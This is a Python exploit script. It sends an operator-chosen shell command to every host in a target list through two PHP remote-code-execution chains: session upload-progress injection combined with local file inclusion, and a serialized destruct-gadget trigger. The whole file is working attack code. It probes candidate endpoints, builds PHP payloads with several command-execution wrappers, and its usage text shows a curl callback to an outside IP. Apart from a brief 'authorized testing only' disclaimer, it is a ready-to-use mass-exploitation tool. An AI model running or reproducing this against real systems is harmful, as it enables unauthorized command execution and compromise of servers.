#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = []
# ///
"""Fire one command at every host in urls.txt through every technique.

No listener, no output parsing, no cleverness: each technique simply sends
the payload that runs the command, and the script prints the HTTP status
codes it got back:

    http://host:18081
      chain A  /chainA/index.php      200 200 200 200   (POST per vector/wrapper)
      chain A  /chainA/lfi.php        200 200 200 200   (GET  per include)

Techniques:
  chain A — PHP written into the session file via session.upload_progress
            (filename vector: single-quote payloads only; progress-value
            vector: everything) then include()d through the LFI endpoint
  chain C — serialized destruct gadget written via the php_serialize dir and
            triggered through the php dir

Both chains also get a plain "run it as-is" payload, so commands with quotes
work through the vector that allows them. Chain B is not attempted: it is a
local unserialize() memory-corruption primitive with no remote delivery.

Usage:
  uv run run_cmd.py --cmd 'id'
  uv run run_cmd.py --cmd 'curl 1.2.3.4:8000' --hosts targets.txt
  uv run run_cmd.py --cmd 'id' --a-write-path /upload.php --a-lfi-path /vuln.php

For authorized testing only.
"""
import argparse
import os
import socket
import ssl
import sys
from urllib.parse import urlparse, quote

B = "RUNCMDBOUND"

WRAPPERS = ["system", "shell_exec", "passthru", "exec", "popen"]

WRITE_CANDIDATES = ["/chainA/index.php", "/chainW/up.php", "/", "/index.php",
                    "/upload.php", "/contact.php"]
LFI_CANDIDATES = [("/chainA/lfi.php", "page"), ("/index.php", "page"),
                  ("/index.php", "file"), ("/index.php", "include"),
                  ("/lfi.php", "page"), ("/vuln.php", "page")]
CW_CANDIDATES = ["/chainW/up.php"]
CR_CANDIDATES = ["/chainR/up.php"]


# ------------------------------------------------------------------ transport
def send(host, port, method, path, body=b"", headers="", scheme="http",
         timeout=10.0, verify=False):
    """Return the HTTP status code, or None on connection failure."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError:
        return None
    if scheme == "https":
        ctx = ssl.create_default_context()
        if not verify:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        try:
            sock = ctx.wrap_socket(sock, server_hostname=host)
        except (ssl.SSLError, OSError):
            sock.close()
            return None
    try:
        h = host if port in (80, 443) else f"{host}:{port}"
        hdr = (f"{method} {path} HTTP/1.1\r\nHost: {h}\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n{headers}\r\n").encode()
        sock.sendall(hdr + body)
        sock.settimeout(timeout)
        data = b""
        while True:
            try:
                d = sock.recv(65536)
                if not d:
                    break
                data += d
                if len(data) > 8192:
                    break
            except socket.timeout:
                break
        try:
            return int(data.split(b" ", 2)[1])
        except (IndexError, ValueError):
            return 0
    except OSError:
        return None
    finally:
        sock.close()


def multipart(host, port, path, sid, progress, filename, **kw):
    body = (
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{progress}\r\n'
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\n'
        f"Z\r\n--{B}--\r\n"
    ).encode("latin-1")
    return send(host, port, "POST", path, body,
                f"Content-Type: multipart/form-data; boundary={B}\r\n", **kw)


def parse_target(line):
    line = line.split("#", 1)[0].strip()
    if not line:
        return None
    if "://" not in line:
        line = "http://" + line
    u = urlparse(line)
    scheme = (u.scheme or "http").lower()
    if scheme not in ("http", "https") or not u.hostname:
        return None
    return (scheme, u.hostname, u.port or (443 if scheme == "https" else 80))


def fmt(code):
    return "---" if code is None else str(code)


# ------------------------------------------------------------------ chain A
def chain_a_php(cmd, verb):
    """Single-quote payload (filename-safe) using `verb` to run `cmd`."""
    q = chr(39)
    return {
        "system": f"<?php system({q}{cmd}{q});?>",
        "shell_exec": f"<?php echo shell_exec({q}{cmd}{q});?>",
        "passthru": f"<?php passthru({q}{cmd}{q});?>",
        "exec": f"<?php exec({q}{cmd}{q});?>",
        "popen": f"<?php $h=popen({q}{cmd}{q},'r');while(!feof($h))echo fgets($h);?>",
    }[verb]


def chain_a_payloads(cmd):
    """(label, php, vector) tuples. Filename vector: single-quote payloads
    only. Progress vector: the command goes in as-is (no quoting limits)."""
    out = []
    for verb in WRAPPERS:
        out.append((f"filename/{verb}", chain_a_php(cmd, verb), "filename"))
    out.append(("progress/raw", f"<?php system({cmd});?>", "progress"))
    return out


def run_chain_a(t, args):
    scheme, host, port = t
    writes = [args.a_write_path] if args.a_write_path else [
        c for c in WRITE_CANDIDATES
        if send(host, port, "GET", c, scheme=scheme,
                timeout=args.timeout, verify=args.verify_tls) in (200, 302, 401, 403)]
    lfis = [(args.a_lfi_path, args.a_lfi_param)] if args.a_lfi_path else LFI_CANDIDATES
    if not writes:
        print("      chain A: no candidate write endpoint answered")
        return
    for wp in writes:
        for lp, param in lfis:
            codes = []
            for label, php, vec in chain_a_payloads(args.cmd):
                sid = "ra" + os.urandom(6).hex()
                sess = f"{args.save_path}/sess_{sid}"
                if vec == "filename":
                    if '"' in php:
                        continue
                    w = multipart(host, port, wp, sid, "x", php, scheme=scheme,
                                  timeout=args.timeout, verify=args.verify_tls)
                else:
                    w = multipart(host, port, wp, sid, php, "n.txt", scheme=scheme,
                                  timeout=args.timeout, verify=args.verify_tls)
                g = send(host, port, "GET", f"{lp}?{param}={quote(sess)}",
                         scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
                codes.append(f"{fmt(w)}/{fmt(g)}")
            print(f"      A {wp} -> {lp}?{param}  {' '.join(codes)}")


# ------------------------------------------------------------------ chain C
def gadget_for(cmd, cls, prop):
    cb, pb, nb = (x.encode("latin-1", "replace") for x in (cls, prop, cmd))
    g = (f'X|O:{len(cb)}:"'.encode() + cb + b'":1:{s:' + str(len(pb)).encode()
         + b':"' + pb + b'";s:' + str(len(nb)).encode() + b':"' + nb + b'";}')
    return g.decode("latin-1")


def run_chain_c(t, args):
    scheme, host, port = t
    cw = args.c_write_path or next(
        (c for c in CW_CANDIDATES
         if send(host, port, "GET", c, scheme=scheme,
                 timeout=args.timeout, verify=args.verify_tls) in (200, 302, 401, 403)), None)
    cr = args.c_read_path or next(
        (c for c in CR_CANDIDATES
         if send(host, port, "GET", c, scheme=scheme,
                 timeout=args.timeout, verify=args.verify_tls) in (200, 302, 401, 403)), None)
    if not (cw and cr):
        print("      chain C: no candidate handler endpoint answered")
        return
    codes = []
    for body in (args.cmd, f"system({args.cmd!r});"):
        sid = "rc" + os.urandom(6).hex()
        w = multipart(host, port, cw, sid, gadget_for(body, args.gadget, args.gadget_prop),
                      "n.txt", scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
        g = multipart(host, port, cr, sid, "x", "n.txt",
                      scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
        codes.append(f"{fmt(w)}/{fmt(g)}")
    print(f"      C {cw} -> {cr}  {' '.join(codes)}")


# ------------------------------------------------------------------ driver
def main():
    ap = argparse.ArgumentParser(description="Fire a command at every host (chains A and C)")
    ap.add_argument("--cmd", required=True, help="command to execute")
    ap.add_argument("--hosts", default="urls.txt", help="target file (default urls.txt)")
    ap.add_argument("--a-write-path", default=None, help="multipart POST endpoint")
    ap.add_argument("--a-lfi-path", default=None, help="LFI endpoint")
    ap.add_argument("--a-lfi-param", default="page")
    ap.add_argument("--c-write-path", default=None)
    ap.add_argument("--c-read-path", default=None)
    ap.add_argument("--gadget", default="Evil")
    ap.add_argument("--gadget-prop", default="cmd")
    ap.add_argument("--save-path", default="/tmp/sess")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--verify-tls", action="store_true")
    args = ap.parse_args()

    try:
        with open(args.hosts, encoding="utf-8") as f:
            lines = f.read().splitlines()
    except OSError as e:
        print(f"[-] cannot read {args.hosts}: {e}", file=sys.stderr)
        sys.exit(2)
    targets = [t for t in (parse_target(l) for l in lines) if t]
    if not targets:
        print(f"[-] no targets in {args.hosts}", file=sys.stderr)
        sys.exit(2)

    print(f"[*] cmd: {args.cmd}")
    print(f"[*] {len(targets)} target(s) from {args.hosts}; codes are POST/GET")
    print("[*] authorized testing only\n")

    for t in targets:
        print(f"[*] {t[0]}://{t[1]}:{t[2]}")
        try:
            run_chain_a(t, args)
            run_chain_c(t, args)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"      error: {e.__class__.__name__}: {e}")
        print()


if __name__ == "__main__":
    main()
